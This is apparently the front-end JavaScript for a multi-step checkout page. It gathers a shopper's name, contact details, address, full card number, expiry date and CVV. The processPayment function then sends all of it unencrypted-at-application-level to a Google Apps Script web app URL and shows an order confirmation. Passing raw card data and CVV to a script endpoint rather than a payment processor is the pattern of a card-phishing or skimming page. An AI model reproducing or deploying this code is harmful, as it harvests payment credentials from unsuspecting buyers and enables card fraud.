// Multi-step form logic for payment.html

let currentStep = 1;
const steps = document.querySelectorAll('.form-step');
const progressSteps = document.querySelectorAll('.step');

function showStep(step) {
    steps.forEach((el, idx) => {
        el.classList.toggle('active', idx === step - 1);
    });
    progressSteps.forEach((el, idx) => {
        el.classList.remove('active', 'completed');
        if (idx < step - 1) {
            el.classList.add('completed');
        } else if (idx === step - 1) {
            el.classList.add('active');
        }
    });
    currentStep = step;
}

window.nextStep = function() {
    const personalForm = document.getElementById('personal-form');
    if (currentStep === 1 && !personalForm.checkValidity()) {
        personalForm.reportValidity();
        return;
    }
    showStep(currentStep + 1);
};

window.prevStep = function() {
    showStep(currentStep - 1);
};

window.processPayment = function() {
    const paymentForm = document.getElementById('payment-form');
    const personalForm = document.getElementById('personal-form');

    // Validate both forms
    if (!paymentForm.checkValidity()) {
        paymentForm.reportValidity();
        return;
    }

    const data = {
        firstName: personalForm.firstName.value,
        lastName: personalForm.lastName.value,
        email: personalForm.email.value,
        phone: personalForm.phone.value,
        address: personalForm.address.value,
        city: personalForm.city.value,
        province: personalForm.province.value,
        postal: personalForm.postal.value,
        country: personalForm.country.value,
        cardNumber: paymentForm.cardNumber.value,
        cardHolder: paymentForm.cardHolder.value,
        expiry: paymentForm.expiry.value,
        cvv: paymentForm.cvv.value
    };

    // Send to Google Apps Script Web App
    fetch('https://script.google.com/macros/s/AKfycbxeEZb8NB1sHpMLeNYi49oyFBcF8QQfhaKchWPTlT-7cGzs8v6M4_OSRRV5Roiuf8Jv/exec', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(data)
    })
    .then(res => res.text())
    .then(response => {
        console.log("Response from Google Script:", response);
        showStep(3); // Only go to confirmation if successful
    })
    .catch(err => {
        console.error("Error submitting form:", err);
        alert("There was a problem submitting your order. Please try again.");
    });
};


window.startOver = function() {
    document.getElementById('personal-form').reset();
    document.getElementById('payment-form').reset();
    showStep(1);
};

// Initialize first step on page load
document.addEventListener('DOMContentLoaded', () => {
    showStep(1);
});
